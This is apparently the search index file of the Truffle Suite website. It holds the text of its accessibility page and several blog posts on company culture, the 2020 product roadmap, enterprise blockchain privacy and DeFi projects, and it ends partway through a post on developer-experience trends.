{"config": {"indexing": "full", "lang": ["en"], "min_search_length": 3, "prebuild_index": false, "separator": "[\\s\\-]+"}, "docs": [{"location": "", "text": "", "title": "Home"}, {"location": "accessibility/", "text": "Accessibility \u00b6 Truffle is committed to providing a website that is accessible to the widest possible audience, regardless of technology or ability. We are actively working to increase the accessibility and usability of our website and the developer tools we create. We endeavor to conform to level Double-A of the World Wide Web Consortium (W3C) Web Content Accessibility Guidelines 2.1. These guidelines explain how to make web content more accessible for people with disabilities. Conformance with these guidelines will help make the web and our tools more user friendly for all people. Whilst we strive to adhere to the accepted guidelines and standards for accessibility and usability, it is not always possible to do so in all areas of the website or tools. We are continually seeking out solutions that will bring all areas of this website and our tools up to the same level of overall web accessibility. In the meantime should you experience any difficulty in accessing the website, please don't hesitate to contact us. You can contact us by sending and email to accessibility@trufflesuite.com", "title": "Accessibility"}, {"location": "accessibility/#accessibility", "text": "Truffle is committed to providing a website that is accessible to the widest possible audience, regardless of technology or ability. We are actively working to increase the accessibility and usability of our website and the developer tools we create. We endeavor to conform to level Double-A of the World Wide Web Consortium (W3C) Web Content Accessibility Guidelines 2.1. These guidelines explain how to make web content more accessible for people with disabilities. Conformance with these guidelines will help make the web and our tools more user friendly for all people. Whilst we strive to adhere to the accepted guidelines and standards for accessibility and usability, it is not always possible to do so in all areas of the website or tools. We are continually seeking out solutions that will bring all areas of this website and our tools up to the same level of overall web accessibility. In the meantime should you experience any difficulty in accessing the website, please don't hesitate to contact us. You can contact us by sending and email to accessibility@trufflesuite.com", "title": "Accessibility"}, {"location": "analytics/", "text": "", "title": "Data Analytics Policy"}, {"location": "blog/", "text": "", "title": "Truffle Blog"}, {"location": "blog/10-things-we-dont-do-that-make-working-at-truffle-awesome/", "text": "At Truffle we have an extremely tight-knit team. You'll see that at this year's TruffleCon, a conference for hundreds of attendees organized by only a handful of people. We often have more work than we can handle, yet we take it on because we love the work we're doing and we love the people we work with. In my history of hopping startups \u2013 I'm currently on number nine \u2013 I haven't seen this anywhere else, so I wanted to take the time to highlight some things that set Truffle apart from the rest. Here's a list of what we don't do that makes working at Truffle awesome: We don't have an office. This is the most important point, as it permeates the makeup and structure of our organization. We have members all over the US and Canada. I live in Yakima, WA, of all places, known more for apples and hops than for tech and blockchain. For communication efficiency we intentionally hired within US time zones, but we realize remote work means there's no office to clock into. We currently have team members working from China, Japan and Germany, following the path their family and personal lives have taken them, while still remaining valuable members of the team. We don't clock in. For most of our team, working remotely means working from home. Often our home life and work life are intertwined, and we know that on some days work wins (i.e., I'm writing this the morning of July 4th, a holiday in the United States), and on other days life wins. This means a flexible schedule is absolutely required. Often, I tell my team to add their life events to their work calendar, like taking their dog to the vet or their kids to school, to ensure work doesn't encroach on the needs of their home life. We don't track vacation time. Our vacation policy is unlimited: We take whatever time we need. This is important to our work/life balance, and it also ensures our team gets much-needed breaks. Over time we've perfected this policy by engaging work and life into a little quid pro quo: If you let your coworkers know about your time off in advance, and you ensure your work is completed and fully handed off to another team member while you're away, then the time is yours. (Emergencies, of course, aren't governed by this policy.) This has worked surprisingly well. Recently a coworker \"sipped bevvies\" in the Bahamas for a week and a half, and his team happily held their own while he was on vacation. We all recognize that we're working extremely hard, so we all want to step in when others need a break. We don't let people burn out. Burn out can be a huge you-know-what. It comes on quick, often sneaking in at the tail end of an intense work effort where life lost out one too many times. It also comes when a striking life event seeps into our work life. It's an energy killer, and a turnover monster out to eat up all our employees. We don't let it eat us. After our first burn out event caused one of our best developers to leave, we created a company policy called the Get Out of Burn Out Free Card. When played, it gives the team member two weeks of vacation starting immediately, no questions asked. It's up to the rest of the team to pick up the slack, and find creative solutions in the team member's absence. It's not a card that gets played often, but it's been played a few times since and we've saved valuable team members from throwing in the towel. Even if the card never gets played, it's reassuring to know other members of the team have our backs in times of need. We don't wear business attire. We work from home, which means we wear the attire we'd normally wear at home. I'm known for wearing pajamas, often brightly colored ones, even during business calls. At the very least, professionalism only matters to the eye of the webcam, and anything out of frame is totally fair game. And heck, we're working hard, so we want to be comfortable. We don't stay remote. Though video calls and Slack messages are our main source of communication, we know nothing builds a relationship better than real human connection. That's why we plan full company retreats three to four times a year, to exciting places that help us all become closer. Our most recent retreat took us to the snowy mountains of Breckinridge, CO. Yes, it was super cold outside and the air was hard to breathe, but it was a new experience for all of us and we came out with some interesting stories to tell. My most memorable moment was when I commandeered a sled and careened right off the side of a hill. Lucky for me it was a false slope and I had no injuries, though my team certainly got a good laugh. We don't try to be fully flat. We love the egalitarian nature of flat organizations, but we also love the efficiency of explicit hierarchy. In our experience flat organizations push hierarchy under the surface, turning decision-making into a confusing game of personal politics and popularity contests. Instead, we take a hybrid approach. We accept that hierarchy exists in our organization, but we try to make it as flat as possible. We push decisions as far down in the hierarchy as they can go, so each team member feels empowered to do the best work possible, and we clearly define the decisions that each role can make. As the CEO of Truffle, I get to make decisions on money and resources, but I'm also the founder, which means I once touched every line of code. That's now Nick D'Andrea's job, our head of engineering, and the jobs of the engineers leading each of our individual engineering projects. We don't leave people hanging. Having a light hierarchy gives us the ability to appoint leads. Leads are sometimes a vehicle for accountability, like managers in traditional organizations, but most of the time they're there to serve the members of our team. Every team member gets a lead, and gets a weekly one-on-one that they can use any way they like. Often these one-on-ones are used as a regular place to vent: they help us catch issues early and provide team members a useful outlet so small issues don't turn into something bigger. Leads go to bat for their team members when the team member doesn't feel comfortable raising an issue themselves. We don\u2019t give in to perfect. At least, not initially. In our organization, perfect is the enemy of the good. Had I not been writing this on Independence Day, I may have shot for ten items to round out the list instead of nine. Similarly, it\u2019s the same reason we release a new version of Truffle weekly: We like to bring value to users as quickly as possible, and then strive towards perfection iteratively over time. This idea governs all the work that we do, from software to sales to even our VC pitch decks, because we realize the feedback we get from users far outweighs our initial ideas at perfection. If you have thoughts on how we can better improve our blog or this blog post, please send me an email at tim@trufflesuite.com. See #9. Working at Truffle has been an amazing journey. It's incredibly humbling to see a project I started from necessity turn into a company run by the heart and soul of a close, tight-knit group of professionals. Truffle would be nothing without this team, and without Truffle I'd likely not be excited to go to work every morning (I commute downstairs in my pajamas, but still). Thank you, Truffle team, for making this company awesome.", "title": "10 Things We Don't Do That Make Working at Truffle Awesome"}, {"location": "blog/2020-is-finally-over-a-year-end-wrapup/", "text": "2020 has been a trying time for us all: COVID-19 is still ravaging the world, the United States mired through one of our most contentious elections yet; basically, it\u2019s been a rough year. It\u2019s not all bad though! Let\u2019s take a look back at some positive things that came out of 2020, along with a little of what to look forward to in 2021. A Look Back \u00b6 ConsenSys Fold-in \u00b6 This year was a busy one for Truffle, but the biggest news squeaked in just in time for the end of the year: Truffle is now a part of ConsenSys! We\u2019re excited to collaborate with Infura, MythX, MetaMask, and more! Teams Enhancements \u00b6 It was also a big year for Truffle Teams. We\u2019ve added new features and enhanced existing ones to complete the core workflow Truffle Teams offers (I summarize this in our final Dapp Lifecycle webinar episode here). Big highlights include the release of: Dashboard ( Blog | Docs ): More incoming data begets a greater need to gain insights and properly segment that data to prevent overload. Truffle Teams new dashboard provides an overview of your application, along with ways to drill down and get further context on more narrow slices. Debugger ( Blog | Docs ): This is a huge workflow enhancement--allowing us to debug transactions in the places we're already viewing--via the deployment details screen or while monitoring individual contracts. Early Access ( Blog ): Truffle Teams is constantly evolving. Between adding new features, polishing, and refining the app there's so much we'd love to share with the world in a faster way. Wouldn't it be nice to take those new enhancements and features for a test drive? Now you can with early access! Deployment and Monitoring Improvements ( Blog | Docs ): We\u2019ve added a table view and a deployment details page. We're also offering more insight into each deployment, by providing the cost and console output. Before the end of this year, we\u2019ll be releasing the Contract Manager to Early Access, completing the workflow and allowing teams to build, deploy, monitor, and debug conveniently in one place. Truffle\u2019s Unstoppable Release Schedule \u00b6 Going on 2 years now, Truffle has released on a weekly basis. We\u2019re so proud of our team for their hard work and commitment to improving the lives of other developers. We don\u2019t have any plans to stop this cadence--full steam ahead for the Truffle train! Debugger and Test Enhancements \u00b6 2020 saw great improvements to Truffle, including debugging verified contracts with truffle debug --fetch-external ( Blog ), support for stacktraces in tests with truffle test --stacktrace ( Blog ), and even freshly-added support for stepping through Vyper contracts! Forking in Ganache \u2013 much improved! \u00b6 Since the summer of 2020 saw DeFi reach a whole new level of usage, more and more people have been looking to test their code against live smart contracts on-chain. Ganache has always had its --fork option, but thanks to members of the community, we\u2019ve fixed more than half a dozen critical bugs that inhibited certain use cases. Forking is more reliable than ever! Collaborations \u00b6 2020 was a year of partnerships for Truffle, seeing us make good on the vision to become a multi-blockchain toolset. Tezos ( Blog | Docs ): Tezos is supported in Truffle! Many of the commands you\u2019re used to are still here: compile, deploy, test, and console! Corda ( Blog | Docs ): Ganache UI supports creating Corda networks! Easily create and introspect into a local Corada development network with a familiar UI. Filecoin ( Blog ): Truffle Preserve allows you to easily preserve files on IPFS and/or Filecoin. Important The Corda flavor is deprecated and has been removed from Ganache UI in v2.7.0. See the release notes for details. A Look Forward \u00b6 Continued Maturation of Truffle Teams \u00b6 Truffle Teams will continue to be enhanced throughout 2021, with useful additions such as: Monitoring enhancements : receive alerts when we observe contract anomalies, such as a sudden spike in failed transactions or a drop in balance. Set up your own custom triggers for things like an event firing or a certain address interacting with your contracts. Debugging public transactions : The debugger only works for sandboxes currently, but we want to bring it to feature parity with the CLI debugger by also supporting public networks. Custom Network Support : Deploy via your own infrastructure by supplying the RPC URL. Put your DappNode to good use! Continuous (Automated) Deployment : You can already deploy manually via Truffle Team\u2019s deployment wizard, but there may be times you know you\u2019ll be continuously deploying your changes. For example iterating on a new feature in a sandbox. Better Dashboard : The dashboard today provides a good overview of your deployment, but we\u2019re going to expand it to provide better drill down functionality and greater context. Advanced Analysis \u00b6 Truffle\u2019s been around for over 5 years now. In that time, we\u2019ve been thinking about how smart contract systems grow and change over time. Be on the lookout for tools to better examine your contract\u2019s deployment history, track contracts across forks, and more! Ganache Rewrite \u00b6 Ganache is getting a tune-up! This means faster execution of your test suites-- 4x faster in the case of SushiSwap\u2019s test suite. Also lookout for ways to test pending transactions, implementation of EIP-1193, the ability to set the account nonce ( evm_setAccountNonce ), and support for running Ganache in the browser. We\u2019ll also begin publishing auto-generated API documentation so you always have a reference close at hand. The Return of the Frontend \u00b6 2020 didn\u2019t see much movement in our set of frontend libraries, Drizzle . In 2021 we\u2019ll be giving some love to the frontend in the form of easier state management, more granular tooling, and more. More Collaborations \u00b6 As mentioned above, now that we\u2019re a part of ConsenSys Software Inc, Truffle's going to have many opportunities to collaborate with other groups. We\u2019d love to hear what this sparks in you! Check out our Slack group below and let us know your thoughts. Here are some links to CSI\u2019s groups so you know what they\u2019re about: Infura MythX ConsenSys Diligence MetaMask CodeFi ConsenSys Quorum Catch us on Slack \u00b6 We want Truffle the best developer tool suite in the blockchain space for new and seasoned devs alike. Let us know what you think about our plans, or if you/your team have other needs we haven't met yet. Continue the conversation with your fellow Trufflers in our Slack community! SIGN UP FOR THE TRUFFLER SLACK Thanks! Josh Quintal, Product Lead & The Whole Team at Truffle", "title": "2020 is Finally Over - A Year End Wrapup"}, {"location": "blog/2020-is-finally-over-a-year-end-wrapup/#a-look-back", "text": "", "title": "A Look Back"}, {"location": "blog/2020-is-finally-over-a-year-end-wrapup/#consensys-fold-in", "text": "This year was a busy one for Truffle, but the biggest news squeaked in just in time for the end of the year: Truffle is now a part of ConsenSys! We\u2019re excited to collaborate with Infura, MythX, MetaMask, and more!", "title": "ConsenSys Fold-in"}, {"location": "blog/2020-is-finally-over-a-year-end-wrapup/#teams-enhancements", "text": "It was also a big year for Truffle Teams. We\u2019ve added new features and enhanced existing ones to complete the core workflow Truffle Teams offers (I summarize this in our final Dapp Lifecycle webinar episode here). Big highlights include the release of: Dashboard ( Blog | Docs ): More incoming data begets a greater need to gain insights and properly segment that data to prevent overload. Truffle Teams new dashboard provides an overview of your application, along with ways to drill down and get further context on more narrow slices. Debugger ( Blog | Docs ): This is a huge workflow enhancement--allowing us to debug transactions in the places we're already viewing--via the deployment details screen or while monitoring individual contracts. Early Access ( Blog ): Truffle Teams is constantly evolving. Between adding new features, polishing, and refining the app there's so much we'd love to share with the world in a faster way. Wouldn't it be nice to take those new enhancements and features for a test drive? Now you can with early access! Deployment and Monitoring Improvements ( Blog | Docs ): We\u2019ve added a table view and a deployment details page. We're also offering more insight into each deployment, by providing the cost and console output. Before the end of this year, we\u2019ll be releasing the Contract Manager to Early Access, completing the workflow and allowing teams to build, deploy, monitor, and debug conveniently in one place.", "title": "Teams Enhancements"}, {"location": "blog/2020-is-finally-over-a-year-end-wrapup/#truffles-unstoppable-release-schedule", "text": "Going on 2 years now, Truffle has released on a weekly basis. We\u2019re so proud of our team for their hard work and commitment to improving the lives of other developers. We don\u2019t have any plans to stop this cadence--full steam ahead for the Truffle train!", "title": "Truffle\u2019s Unstoppable Release Schedule"}, {"location": "blog/2020-is-finally-over-a-year-end-wrapup/#debugger-and-test-enhancements", "text": "2020 saw great improvements to Truffle, including debugging verified contracts with truffle debug --fetch-external ( Blog ), support for stacktraces in tests with truffle test --stacktrace ( Blog ), and even freshly-added support for stepping through Vyper contracts!", "title": "Debugger and Test Enhancements"}, {"location": "blog/2020-is-finally-over-a-year-end-wrapup/#forking-in-ganache-much-improved", "text": "Since the summer of 2020 saw DeFi reach a whole new level of usage, more and more people have been looking to test their code against live smart contracts on-chain. Ganache has always had its --fork option, but thanks to members of the community, we\u2019ve fixed more than half a dozen critical bugs that inhibited certain use cases. Forking is more reliable than ever!", "title": "Forking in Ganache \u2013 much improved!"}, {"location": "blog/2020-is-finally-over-a-year-end-wrapup/#collaborations", "text": "2020 was a year of partnerships for Truffle, seeing us make good on the vision to become a multi-blockchain toolset. Tezos ( Blog | Docs ): Tezos is supported in Truffle! Many of the commands you\u2019re used to are still here: compile, deploy, test, and console! Corda ( Blog | Docs ): Ganache UI supports creating Corda networks! Easily create and introspect into a local Corada development network with a familiar UI. Filecoin ( Blog ): Truffle Preserve allows you to easily preserve files on IPFS and/or Filecoin. Important The Corda flavor is deprecated and has been removed from Ganache UI in v2.7.0. See the release notes for details.", "title": "Collaborations"}, {"location": "blog/2020-is-finally-over-a-year-end-wrapup/#a-look-forward", "text": "", "title": "A Look Forward"}, {"location": "blog/2020-is-finally-over-a-year-end-wrapup/#continued-maturation-of-truffle-teams", "text": "Truffle Teams will continue to be enhanced throughout 2021, with useful additions such as: Monitoring enhancements : receive alerts when we observe contract anomalies, such as a sudden spike in failed transactions or a drop in balance. Set up your own custom triggers for things like an event firing or a certain address interacting with your contracts. Debugging public transactions : The debugger only works for sandboxes currently, but we want to bring it to feature parity with the CLI debugger by also supporting public networks. Custom Network Support : Deploy via your own infrastructure by supplying the RPC URL. Put your DappNode to good use! Continuous (Automated) Deployment : You can already deploy manually via Truffle Team\u2019s deployment wizard, but there may be times you know you\u2019ll be continuously deploying your changes. For example iterating on a new feature in a sandbox. Better Dashboard : The dashboard today provides a good overview of your deployment, but we\u2019re going to expand it to provide better drill down functionality and greater context.", "title": "Continued Maturation of Truffle Teams"}, {"location": "blog/2020-is-finally-over-a-year-end-wrapup/#advanced-analysis", "text": "Truffle\u2019s been around for over 5 years now. In that time, we\u2019ve been thinking about how smart contract systems grow and change over time. Be on the lookout for tools to better examine your contract\u2019s deployment history, track contracts across forks, and more!", "title": "Advanced Analysis"}, {"location": "blog/2020-is-finally-over-a-year-end-wrapup/#ganache-rewrite", "text": "Ganache is getting a tune-up! This means faster execution of your test suites-- 4x faster in the case of SushiSwap\u2019s test suite. Also lookout for ways to test pending transactions, implementation of EIP-1193, the ability to set the account nonce ( evm_setAccountNonce ), and support for running Ganache in the browser. We\u2019ll also begin publishing auto-generated API documentation so you always have a reference close at hand.", "title": "Ganache Rewrite"}, {"location": "blog/2020-is-finally-over-a-year-end-wrapup/#the-return-of-the-frontend", "text": "2020 didn\u2019t see much movement in our set of frontend libraries, Drizzle . In 2021 we\u2019ll be giving some love to the frontend in the form of easier state management, more granular tooling, and more.", "title": "The Return of the Frontend"}, {"location": "blog/2020-is-finally-over-a-year-end-wrapup/#more-collaborations", "text": "As mentioned above, now that we\u2019re a part of ConsenSys Software Inc, Truffle's going to have many opportunities to collaborate with other groups. We\u2019d love to hear what this sparks in you! Check out our Slack group below and let us know your thoughts. Here are some links to CSI\u2019s groups so you know what they\u2019re about: Infura MythX ConsenSys Diligence MetaMask CodeFi ConsenSys Quorum", "title": "More Collaborations"}, {"location": "blog/2020-is-finally-over-a-year-end-wrapup/#catch-us-on-slack", "text": "We want Truffle the best developer tool suite in the blockchain space for new and seasoned devs alike. Let us know what you think about our plans, or if you/your team have other needs we haven't met yet. Continue the conversation with your fellow Trufflers in our Slack community! SIGN UP FOR THE TRUFFLER SLACK Thanks! Josh Quintal, Product Lead & The Whole Team at Truffle", "title": "Catch us on Slack"}, {"location": "blog/3-ways-enterprises-are-addressing-blockchain-privacy-concerns/", "text": "Blockchain has been touted as the great connector to integrate businesses under consortium networks . It\u2019s ability to verify data using smart contracts and provide transparency across network participants through immutable shared data has people talking about a technical revolution. However, this benefit has been a double-edged sword because the enterprise world is skeptical about sharing sensitive data on a ledger where the information cannot be deleted. The good news is, this year has seen numerous announcements of single and multi-party blockchain pilots by the Fortune 500 such as\u2026 Starbucks and MetLife . Data privacy issues haven\u2019t stopped them and the enterprise blockchain world has taken these steps to shift their thinking. 1. Store references to data on the blockchain \u00b6 The simplest way to circumvent this data privacy issue is to not put the data on the chain. A popular approach is to share anonymous IDs on the blockchain and use that to get data from another system. For example, MediLedger is a supply chain pilot in the heavily regulated pharmaceutical industry that uses a blockchain to trace a drug\u2019s exchange of hands and then uses another private peer-to-peer application to transfer details about the medication. What is passed around on the chain is just an anonymous identifier to the medication. This keeps transactions light, allows enterprises to regulate data access, and uses proven methods to secure sensitive data. MediLedger actually takes this a step further and anonymizes the transaction details with zero knowledge proofs \u2014 which I\u2019ll cover later. 2. Use blockchains to verify instead of share \u00b6 Blockchain\u2019s real power is in its ability to verify data. Instead of putting actual information on the chain, a solution could combine unique elements of data and share a hash of it on the blockchain. Hashing is a cryptographic method that generates a random, unique value from a fed input. In this scenario, the resulting hash itself doesn\u2019t reveal any information, but it can verify an on-hand document by checking if it generates the same hash when fed into the function. The data inputs could also be selected in a way that no critical information is sampled to create the hash so that compliance regulations can be withheld. Businesses have reliable methods to exchange data, but the verification is long and expensive. By using blockchain as a verifier and not the store of the data, we can ease the pain point and maintain a higher level of privacy than open sharing. 3. Anonymize transactions with zero knowledge proofs \u00b6 Building off the two previous trends, blockchain pilots have taken an extra step in securing data and replaced hashed transaction details with zero knowledge proofs (ZKP). ZKPs allow for verification of a transaction without exposing transaction details . Now two businesses can communicate on a public network and be completely anonymous. This is because what is placed on the chain is a proof that is cryptographically verified by the receiver, not the data that goes into the transaction. This shift in data validation methods addresses data privacy concerns and supports industry consortiums. Blockchain is just one piece of the puzzle \u00b6 Finally, with all the hype on blockchain\u2019s potential in the last years, we have to remember that this is just another tool in the technology box when solving a problem. Enterprises have gotten smarter in finding ways to use blockchain to solve unique problems that are more expensive or less reliable with other technologies. What we have seen is that distributed ledgers can\u2019t do everything, but when paired with multiple other technologies that help fill gaps, the solution as a whole is optimized. A better perspective is to not think of future solutions as blockchain applications, but rather applications that leverage the unique advantages of blockchain. About West Monroe Partners \u00b6 West Monroe is a national business and technology consulting firm that partners with dynamic organizations to reimagine, build, and operate their businesses at peak performance. Our team of more than 1,400 professionals across nine offices is comprised of an uncommon blend of business consultants and deep technologists. I am one of those consultants and I am one of the leaders of our blockchain center of excellence. I\u2019ll be presenting on Sunday morning (8/4) about one of our blockchain projects that looks to incentivize electric vehicle owners to charge with cleaner energy . Check us out at our website and read more about our blockchain perspectives on our blog! Danny Pan is a consultant with West Monroe Partner\u2019s Seattle Technology Practice. He focuses on providing value in adopting blockchain, distributed technologies, and robust SDLC practices. Contact Danny at dpan@wmp.com", "title": "3 Ways Enterprises Are Addressing Blockchain Privacy Concerns"}, {"location": "blog/3-ways-enterprises-are-addressing-blockchain-privacy-concerns/#1-store-references-to-data-on-the-blockchain", "text": "The simplest way to circumvent this data privacy issue is to not put the data on the chain. A popular approach is to share anonymous IDs on the blockchain and use that to get data from another system. For example, MediLedger is a supply chain pilot in the heavily regulated pharmaceutical industry that uses a blockchain to trace a drug\u2019s exchange of hands and then uses another private peer-to-peer application to transfer details about the medication. What is passed around on the chain is just an anonymous identifier to the medication. This keeps transactions light, allows enterprises to regulate data access, and uses proven methods to secure sensitive data. MediLedger actually takes this a step further and anonymizes the transaction details with zero knowledge proofs \u2014 which I\u2019ll cover later.", "title": "1. Store references to data on the blockchain"}, {"location": "blog/3-ways-enterprises-are-addressing-blockchain-privacy-concerns/#2-use-blockchains-to-verify-instead-of-share", "text": "Blockchain\u2019s real power is in its ability to verify data. Instead of putting actual information on the chain, a solution could combine unique elements of data and share a hash of it on the blockchain. Hashing is a cryptographic method that generates a random, unique value from a fed input. In this scenario, the resulting hash itself doesn\u2019t reveal any information, but it can verify an on-hand document by checking if it generates the same hash when fed into the function. The data inputs could also be selected in a way that no critical information is sampled to create the hash so that compliance regulations can be withheld. Businesses have reliable methods to exchange data, but the verification is long and expensive. By using blockchain as a verifier and not the store of the data, we can ease the pain point and maintain a higher level of privacy than open sharing.", "title": "2. Use blockchains to verify instead of share"}, {"location": "blog/3-ways-enterprises-are-addressing-blockchain-privacy-concerns/#3-anonymize-transactions-with-zero-knowledge-proofs", "text": "Building off the two previous trends, blockchain pilots have taken an extra step in securing data and replaced hashed transaction details with zero knowledge proofs (ZKP). ZKPs allow for verification of a transaction without exposing transaction details . Now two businesses can communicate on a public network and be completely anonymous. This is because what is placed on the chain is a proof that is cryptographically verified by the receiver, not the data that goes into the transaction. This shift in data validation methods addresses data privacy concerns and supports industry consortiums.", "title": "3. Anonymize transactions with zero knowledge proofs"}, {"location": "blog/3-ways-enterprises-are-addressing-blockchain-privacy-concerns/#blockchain-is-just-one-piece-of-the-puzzle", "text": "Finally, with all the hype on blockchain\u2019s potential in the last years, we have to remember that this is just another tool in the technology box when solving a problem. Enterprises have gotten smarter in finding ways to use blockchain to solve unique problems that are more expensive or less reliable with other technologies. What we have seen is that distributed ledgers can\u2019t do everything, but when paired with multiple other technologies that help fill gaps, the solution as a whole is optimized. A better perspective is to not think of future solutions as blockchain applications, but rather applications that leverage the unique advantages of blockchain.", "title": "Blockchain is just one piece of the puzzle"}, {"location": "blog/3-ways-enterprises-are-addressing-blockchain-privacy-concerns/#about-west-monroe-partners", "text": "West Monroe is a national business and technology consulting firm that partners with dynamic organizations to reimagine, build, and operate their businesses at peak performance. Our team of more than 1,400 professionals across nine offices is comprised of an uncommon blend of business consultants and deep technologists. I am one of those consultants and I am one of the leaders of our blockchain center of excellence. I\u2019ll be presenting on Sunday morning (8/4) about one of our blockchain projects that looks to incentivize electric vehicle owners to charge with cleaner energy . Check us out at our website and read more about our blockchain perspectives on our blog! Danny Pan is a consultant with West Monroe Partner\u2019s Seattle Technology Practice. He focuses on providing value in adopting blockchain, distributed technologies, and robust SDLC practices. Contact Danny at dpan@wmp.com", "title": "About West Monroe Partners"}, {"location": "blog/4-defi-projects-who-remain-strong-in-the-bear-market/", "text": "By Kingsley Arinze Over the past few weeks, the crypto industry has faced many challenges that have caused some to question the principles upon which Web3 was founded. The events surrounding the FTX exchange that continue to unfold have made the difference between DeFi and CeFi more clear than ever. In case you\u2019ve not been following, FTX, which at its peak was the second-largest crypto exchange by volume, crashed on November 8 owning up to reports of being insolvent. Although this is an unfortunate situation, it\u2019s important that it doesn\u2019t define nor represent the entire industry and that above all, we keep morale high to build and see another bull run yet again. Here are 4 DeFi projects who remain strong to keep your hopes high and your heads down for building. Uniswap \u00b6 Uniswap is a decentralized exchange that allows users to trade Ethereum (ERC20) tokens permissionlessly, without the need to interact with any centralized entity. The DeFi exchange was launched in November 2018 and has evolved through 3 versions. It currently has a monthly active user count of 3.6 million and a total value locked (TVL) of 3.32 billion at the time of writing. Uniswap recently launched UniswapV3 , which introduces new features like concentrated liquidity and multiple fee tiers, making Uniswap efficient and flexible. As a testament, it has seen growth throughout this month as its daily new transacting wallets reached an all-time high of 55,550 , signifying an increasing trust in code and maths, as opposed to institutions. Maker \u00b6 Maker is a peer-to-contract lending platform enabling over-collateralized loans by locking Ether in a smart contract and minting Dai, a stablecoin pegged to the US dollar. Its stability is achieved through a dynamic system of collateralized debt positions, autonomous feedback mechanisms, and incentives for external actors. Elements of the Maker protocol include Dai stablecoin, Maker Collateral Vaults, Oracles, and Voting. MakerDAO governs the Maker Protocol by deciding on key parameters through the voting power of MKR holders. It was launched in November 2017 and currently only runs on Ethereum, with a total value locked of 6.46 billion at the time of writing. It currently holds the number 1 position for DeFi protocol with the most total value locked, with a dominance ratio of 11.85%. AAVE \u00b6 Aave is a community-governed decentralized liquidity protocol that allows users to earn interest, borrow assets, and build applications on top of its liquidity. It is available across 7 networks: Ethereum, Avalanche, Optimism, and more. Aave originally started as ETHLend in 2017, a platform that allowed users to make loan requests and offers, acting more as a community tool than an automated service. In 2020, it rebranded to Aave, migrating from the LEND token to Aave, and expanding its product offering to include loaning and borrowing, staking, and flash loans. Aave currently has 6.43 billion in TVL across 7 networks and 13 markets. It has 1,308 daily active addresses and holds the number 2 position for DeFi platform with the most TVL. Aave is also the founding team behind the creation of LensProtocol , a decentralized, open-source protocol that enables a new generation of social networks. Compound Finance \u00b6 Compound is another leading DeFi protocol in the ecosystem today. It is an open-source algorithmic cryptocurrency lending platform that allows users to earn \u201ccompound\u201d interest on their cryptocurrency sitting idle in a wallet. It was founded in 2017 and only runs on Ethereum. Compound has a total value locked of 2.45 billion , including borrowed assets as of this writing. Recently, they announced the release of compoundV3 , which reduces the number of supported tokens that can be borrowed and collateralized on the protocol. CompoundV3 uses Chainlink as its exclusive price feed and simplifies governance smart contracts, enhancing the system\u2019s security and scalability. Conclusion \u00b6 A common theme across these projects is they are all decentralized, with no centralized entity running the show from behind the scenes. These projects all rely on smart contracts available to the public to audit and analyze at any time. Decentralization allows each of these platforms to continue to hold and protect the trust of their users. In light of the FTX downfall, it is important that we continue to build, sticking to the vision of web3, toward a more decentralized future where greater economic power rests in the hands of the individual. Remember, not your keys, not your crypto! Although these projects listed in this post are a representation of what decentralization should be, hence their continuous growth and trust from their users, this post is NOT financial advice.", "title": "4 DeFi projects who remain strong in the bear market"}, {"location": "blog/4-defi-projects-who-remain-strong-in-the-bear-market/#uniswap", "text": "Uniswap is a decentralized exchange that allows users to trade Ethereum (ERC20) tokens permissionlessly, without the need to interact with any centralized entity. The DeFi exchange was launched in November 2018 and has evolved through 3 versions. It currently has a monthly active user count of 3.6 million and a total value locked (TVL) of 3.32 billion at the time of writing. Uniswap recently launched UniswapV3 , which introduces new features like concentrated liquidity and multiple fee tiers, making Uniswap efficient and flexible. As a testament, it has seen growth throughout this month as its daily new transacting wallets reached an all-time high of 55,550 , signifying an increasing trust in code and maths, as opposed to institutions.", "title": "Uniswap"}, {"location": "blog/4-defi-projects-who-remain-strong-in-the-bear-market/#maker", "text": "Maker is a peer-to-contract lending platform enabling over-collateralized loans by locking Ether in a smart contract and minting Dai, a stablecoin pegged to the US dollar. Its stability is achieved through a dynamic system of collateralized debt positions, autonomous feedback mechanisms, and incentives for external actors. Elements of the Maker protocol include Dai stablecoin, Maker Collateral Vaults, Oracles, and Voting. MakerDAO governs the Maker Protocol by deciding on key parameters through the voting power of MKR holders. It was launched in November 2017 and currently only runs on Ethereum, with a total value locked of 6.46 billion at the time of writing. It currently holds the number 1 position for DeFi protocol with the most total value locked, with a dominance ratio of 11.85%.", "title": "Maker"}, {"location": "blog/4-defi-projects-who-remain-strong-in-the-bear-market/#aave", "text": "Aave is a community-governed decentralized liquidity protocol that allows users to earn interest, borrow assets, and build applications on top of its liquidity. It is available across 7 networks: Ethereum, Avalanche, Optimism, and more. Aave originally started as ETHLend in 2017, a platform that allowed users to make loan requests and offers, acting more as a community tool than an automated service. In 2020, it rebranded to Aave, migrating from the LEND token to Aave, and expanding its product offering to include loaning and borrowing, staking, and flash loans. Aave currently has 6.43 billion in TVL across 7 networks and 13 markets. It has 1,308 daily active addresses and holds the number 2 position for DeFi platform with the most TVL. Aave is also the founding team behind the creation of LensProtocol , a decentralized, open-source protocol that enables a new generation of social networks.", "title": "AAVE"}, {"location": "blog/4-defi-projects-who-remain-strong-in-the-bear-market/#compound-finance", "text": "Compound is another leading DeFi protocol in the ecosystem today. It is an open-source algorithmic cryptocurrency lending platform that allows users to earn \u201ccompound\u201d interest on their cryptocurrency sitting idle in a wallet. It was founded in 2017 and only runs on Ethereum. Compound has a total value locked of 2.45 billion , including borrowed assets as of this writing. Recently, they announced the release of compoundV3 , which reduces the number of supported tokens that can be borrowed and collateralized on the protocol. CompoundV3 uses Chainlink as its exclusive price feed and simplifies governance smart contracts, enhancing the system\u2019s security and scalability.", "title": "Compound Finance"}, {"location": "blog/4-defi-projects-who-remain-strong-in-the-bear-market/#conclusion", "text": "A common theme across these projects is they are all decentralized, with no centralized entity running the show from behind the scenes. These projects all rely on smart contracts available to the public to audit and analyze at any time. Decentralization allows each of these platforms to continue to hold and protect the trust of their users. In light of the FTX downfall, it is important that we continue to build, sticking to the vision of web3, toward a more decentralized future where greater economic power rests in the hands of the individual. Remember, not your keys, not your crypto! Although these projects listed in this post are a representation of what decentralization should be, hence their continuous growth and trust from their users, this post is NOT financial advice.", "title": "Conclusion"}, {"location": "blog/5-trends-impacting-the-blockchain-developer-experience/", "text": "In this article we explore 5 trends impacting the developer-experience (or DX) when it comes to building blockchain-based solutions. Specifically, applications and services that leverage a blockchain or distributed ledger or as part of their overall architecture. This is, of course, is by no means a definitive list. As with everything in the industry, change is happening fast and as such, this is more of a selection of trends that are on the team\u2019s radar. If there\u2019s anything 